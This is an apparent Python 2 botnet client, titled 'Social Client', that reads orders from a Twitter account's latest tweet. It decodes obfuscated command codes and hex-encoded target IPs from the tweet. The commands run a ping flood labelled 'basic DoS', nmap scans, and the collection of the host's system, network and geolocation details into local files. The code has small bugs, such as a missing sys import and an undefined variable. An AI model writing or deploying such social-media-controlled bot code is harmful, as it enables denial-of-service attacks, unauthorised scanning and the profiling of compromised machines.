#Social Client
import os
import subprocess
from libnmap.process import NmapProcess
from time import sleep
from scrapetwit import* # Author - ThePythonDjango.Com with minor tweaks for this script
import platform
import ipaddress
from netaddr import *
import pprint
import geocoder
import socket

#return the last tweet
def getLastTweet():
    try:
        file = open(filename,"r")
    except IOError:
        print "Could not read file:", fname
        sys.exit()

    with file:
        twitText = file.read()
        file.close()

    startTweets = twitText.find("[")
    endTweets = twitText.find("]")


    justTweets = twitText[startTweets+1:endTweets] #extract tweet text
    lastTweet = justTweets.split(",",1)[0] #return last tweet only
    return lastTweet.replace('"','') #strip quotations

#convert IP code from hex to decimal IPV4 format
def decodeIP(IPcode):
    oct1 = str(int(IPcode[0:2],16))
    oct2 = str(int(IPcode[2:4],16))
    oct3 = str(int(IPcode[4:6],16))
    oct4 = str(int(IPcode[6:8],16))

    return oct1+"."+oct2+"."+oct3+"."+oct4

def getMyIP():
    sck = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sck.connect(("8.8.8.8",80))
    return sck.getsockname()[0]


#Begin code
taccount = "Rick58992217" #set Twitter account name

#start(taccount) #use the scrapetwit script to access the specified twitter account

filename = taccount+"_twitter.json" #set filename that contains scraped tweets

tweetComm = getLastTweet()

label, command, IPcode = tweetComm.split("|", 3)

IPaddr = decodeIP(IPcode)

#flood IP with pings - basic DoS
if command == "ds7656":
    print "ping "+IPaddr
    os.system("ping -c 10 " + IPaddr)

#add client to list 
elif command == "ac73456":
    print "add client " + IPaddr
    file = open("clientList.txt","a")
    file.write(IPaddr)
    file.close()

#scan IP    
elif command == "sc26769":
    print "scan " + IPaddr
    nmap_proc = NmapProcess(targets=IPaddr, options="-sT")
    nmap_proc.run_background()
    while nmap_proc.is_running():
        print("Nmap Scan running: ETC: {0} DONE: {1}%".format(nmap_proc.etc,nmap_proc.progress))
        sleep(2)
    file = open("scanresult.txt","w")
    file.write("rc: {0} output: {1}".format(nmap_proc.rc, nmap_proc.summary))
    file.close()
    print("scan completed and written to file \n")

#get system info   
elif command == "si37465":
    print "Get this system's info ..."
    sysinfo = 'System Information \n'\
    'uname     :%s \n' \
    'system    :%s \n' \
    'node      :%s \n' \
    'release   :%s \n' \
    'version   :%s \n' \
    'machine   :%s \n' \
    'processor :%s \n' % (platform.uname(), platform.system(), platform.node(), platform.release(), platform.version(), platform.machine(), platform.processor())
    file = open("sysinfo.txt","w")
    file.write(sysinfo)
    file.close()    

#get network info
elif command == "ni496320":
    print "Get this system's network info ..."
    netinfo = os.popen("ifconfig").read()
    file = open("netinfo.txt","w")
    file.write(netinfo)
    file.close()

#get geolocation  
elif command == "gi195456":
    myIP = getMyIP()
    geo = geocoder.ip('me')
    print "get system's geo information"
    sysinfo = 'Geo Information %s\n'\
    'public IP    :%s \n' \
    'lat / long   :%s \n' \
    'country      :%s \n' \
    'state        :%s \n' \
    'city         :%s \n' % (myIP, geo.ip, geo.latlng, geo.country, geo.state, geo.city)
    file = open("geoinfo.txt","w")
    file.write(sysinfo)
    file.close()

else:
    print "No valid command found"
